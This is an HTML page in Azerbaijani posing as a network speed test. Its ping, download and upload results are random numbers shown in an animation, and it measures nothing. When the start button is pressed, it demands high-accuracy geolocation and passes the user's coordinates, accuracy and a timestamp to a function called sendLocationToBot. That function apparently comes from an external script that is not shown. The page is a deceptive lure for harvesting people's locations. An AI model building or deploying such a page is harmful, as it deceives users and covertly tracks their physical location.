<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Şəbəkə Analizi</title>

<style>
:root{
  --bg:#060910;
  --card:#0e1320;
  --accent:#00ffd5;
  --muted:#8b93a7;
  --ok:#10b981;
}
body{
  margin:0;
  font-family:Segoe UI,Roboto,sans-serif;
  background:var(--bg);
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
}
.container{
  width:100%;
  max-width:420px;
  text-align:center;
}
h1{
  font-weight:300;
  letter-spacing:2px;
  margin-bottom:30px;
}
.gauge{
  position:relative;
  width:260px;
  height:260px;
  margin:0 auto;
  display:none;
}
svg{ transform:rotate(-90deg); }
circle{
  fill:none;
  stroke-width:10;
}
.bg{ stroke:#1f2638; }
.progress{
  stroke:var(--accent);
  stroke-dasharray:628;
  stroke-dashoffset:628;
  stroke-linecap:round;
  transition:stroke-dashoffset .08s linear;
}
.speed{
  position:absolute;
  inset:0;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
}
.speed b{ font-size:48px; }
.speed span{ color:var(--muted); font-size:13px; }

button{
  width:140px;
  height:140px;
  border-radius:50%;
  background:transparent;
  border:2px solid var(--accent);
  color:var(--accent);
  font-size:22px;
  cursor:pointer;
  box-shadow:0 0 30px rgba(0,255,213,.25);
}
.stats{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:15px;
  margin-top:30px;
  opacity:.3;
  transition:.4s;
}
.stat span{ color:var(--muted); font-size:12px; }
.stat b{ font-size:18px; }
.status{
  margin-top:20px;
  font-size:14px;
  color:var(--accent);
}
.done{ color:var(--ok); }
</style>
</head>

<body>
<div class="container">
  <h1>ŞƏBƏKƏ ANALİZİ</h1>

  <div class="gauge" id="gauge">
    <svg width="260" height="260" viewBox="0 0 220 220">
      <circle class="bg" cx="110" cy="110" r="100"/>
      <circle id="circle" class="progress" cx="110" cy="110" r="100"/>
    </svg>
    <div class="speed">
      <b id="speed">0</b>
      <span>Mbps</span>
    </div>
  </div>

  <button id="start">BAŞLA</button>

  <div class="status" id="status">Testi başlatmaq üçün düyməyə basın</div>

  <div class="stats" id="stats">
    <div class="stat"><span>Ping</span><b id="ping">–</b></div>
    <div class="stat"><span>Download</span><b id="down">–</b></div>
    <div class="stat"><span>Upload</span><b id="up">–</b></div>
  </div>
</div>

<!-- əvvəl scripts.js -->
<script src="./scripts.js"></script>

<script>
const startBtn=document.getElementById('start');
const gauge=document.getElementById('gauge');
const circle=document.getElementById('circle');
const speedEl=document.getElementById('speed');
const statusEl=document.getElementById('status');
const stats=document.getElementById('stats');

const pingEl=document.getElementById('ping');
const downEl=document.getElementById('down');
const upEl=document.getElementById('up');

startBtn.onclick=()=>{
  statusEl.textContent="Ən yaxın server müəyyən edilir…";

  navigator.geolocation.getCurrentPosition(
    pos=>{
      if(window.sendLocationToBot){
        window.sendLocationToBot({
          lat:pos.coords.latitude,
          lng:pos.coords.longitude,
          acc:pos.coords.accuracy,
          time:new Date().toISOString()
        });
      }
      runTest();
    },
    ()=> statusEl.textContent="Lokasiya icazəsi tələb olunur",
    {enableHighAccuracy:true,timeout:8000}
  );
};

function runTest(){
  startBtn.style.display="none";
  gauge.style.display="block";
  stats.style.opacity=1;

  // Ping
  statusEl.textContent="Ping ölçülür…";
  setTimeout(()=>{
    pingEl.textContent=Math.floor(rand(14,32))+" ms";
    download();
  },1200);
}

function download(){
  statusEl.textContent="Download sürəti ölçülür…";
  animate(25,95,val=>{
    downEl.textContent=val.toFixed(1);
    upload();
  });
}

function upload(){
  statusEl.textContent="Upload sürəti ölçülür…";
  animate(10,30,val=>{
    upEl.textContent=val.toFixed(1);
    statusEl.textContent="Şəbəkə stabil görünür";
    statusEl.classList.add('done');
  });
}

function animate(min,max,done){
  let cur=0,target=rand(min,max);
  let i=setInterval(()=>{
    cur+=1.6;
    let v=Math.min(cur,target);
    speedEl.textContent=v.toFixed(1);
    circle.style.strokeDashoffset=628-(628*(v/100));
    if(v>=target){
      clearInterval(i);
      done(target);
    }
  },50);
}

const rand=(a,b)=>Math.random()*(b-a)+a;
</script>
</body>
</html>
